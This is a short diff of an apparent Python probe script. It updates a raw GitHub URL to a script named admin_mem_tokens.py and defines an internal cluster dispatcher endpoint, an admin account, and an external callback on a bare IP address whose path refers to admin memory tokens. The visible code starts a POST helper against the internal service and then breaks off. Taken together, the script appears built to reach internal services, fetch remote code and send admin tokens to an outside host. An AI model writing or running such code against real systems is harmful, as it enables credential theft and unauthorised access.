@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 import json,os,time,urllib.error,urllib.request
-B='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local';H='https://snapgpt.labs.snaplogicdev.com';U='daniel+admin@armorerlabs.com';S='https://54.209.51.244.sslip.io/callback/snapgpt-admin-mem-tokens-two-20261107';RAW='https://raw.githubusercontent.com/begimher/snapgpt-probes/7dfcd69/admin_mem_tokens.py'
+B='http://lrs-pygencc-dispatcher-canv2.canv2-sl-app-launcher.svc.cluster.local';H='https://snapgpt.labs.snaplogicdev.com';U='daniel+admin@armorerlabs.com';S='https://54.209.51.244.sslip.io/callback/snapgpt-admin-mem-tokens-two-20261107';RAW='https://raw.githubusercontent.com/begimher/snapgpt-probes/8aed735/admin_mem_tokens.py'
 def p(path,o,t=300):
  q=urllib.request.Request(B+path,data=json.dumps(o,separators=(',',':')).encode(),method='POST',headers={'Content-Type':'application/json','X-SL-Token':'x'})
  try:
